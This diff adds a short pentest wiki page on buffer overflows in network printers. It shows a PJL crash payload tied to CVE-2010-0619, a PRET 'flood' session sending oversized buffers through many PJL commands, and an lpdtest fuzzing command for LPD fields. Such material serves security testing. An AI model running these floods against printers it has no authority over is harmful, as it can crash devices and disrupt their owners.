@@ -1,0 +1,49 @@
+# Buffer Overflows
+
+## PJL
+
+Various _Lexmark_ laser printers crash when when receiving about 1.000 characters as the INQUIRE argument \(see [CVE-2010-0619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0619)\) and sending about 3.000 characters as the SET argument to the _Dell 1720n_ crashes the device:
+
+```text
+@PJL INQUIRE 00000000000000000000000000000000000000000000000000000…
+```
+
+You can check for Buffer Overflows using [**PRET**](https://github.com/RUB-NDS/PRET):
+
+```bash
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> flood
+Buffer size: 10000, Sending: @PJL SET [buffer]
+Buffer size: 10000, Sending: @PJL [buffer]
+Buffer size: 10000, Sending: @PJL COMMENT [buffer]
+Buffer size: 10000, Sending: @PJL ENTER LANGUAGE=[buffer]
+Buffer size: 10000, Sending: @PJL JOB NAME="[buffer]"
+Buffer size: 10000, Sending: @PJL EOJ NAME="[buffer]"
+Buffer size: 10000, Sending: @PJL INFO [buffer]
+Buffer size: 10000, Sending: @PJL ECHO [buffer]
+Buffer size: 10000, Sending: @PJL INQUIRE [buffer]
+Buffer size: 10000, Sending: @PJL DINQUIRE [buffer]
+Buffer size: 10000, Sending: @PJL USTATUS [buffer]
+Buffer size: 10000, Sending: @PJL RDYMSG DISPLAY="[buffer]"
+Buffer size: 10000, Sending: @PJL FSQUERY NAME="[buffer]"
+Buffer size: 10000, Sending: @PJL FSDIRLIST NAME="[buffer]"
+Buffer size: 10000, Sending: @PJL FSINIT VOLUME="[buffer]"
+Buffer size: 10000, Sending: @PJL FSMKDIR NAME="[buffer]"
+Buffer size: 10000, Sending: @PJL FSUPLOAD NAME="[buffer]"
+```
+
+## LPD daemon
+
+It allows multiple user-defined vectors like _jobname, username or hostname_, which may **not be sufficiently protected. S**everal vulnerabilities related to this malfunction has been already discovered.
+
+A simple **LPD fuzzer** to test for buffer overflows can be created using the `lpdtest` tool **included** in [PRET](https://github.com/RUB-NDS/PRET). The `in` argument sets all user inputs defined by the LPD protocol to a certain value \(in this case, Python output\):
+
+```bash
+./lpdtest.py printer in "`python -c 'print "x"*150'`"
+```
+
+**You can find more information about these attacks in** [**http://hacking-printers.net/wiki/index.php/Buffer\_overflows**](http://hacking-printers.net/wiki/index.php/Buffer_overflows)\*\*\*\*
+
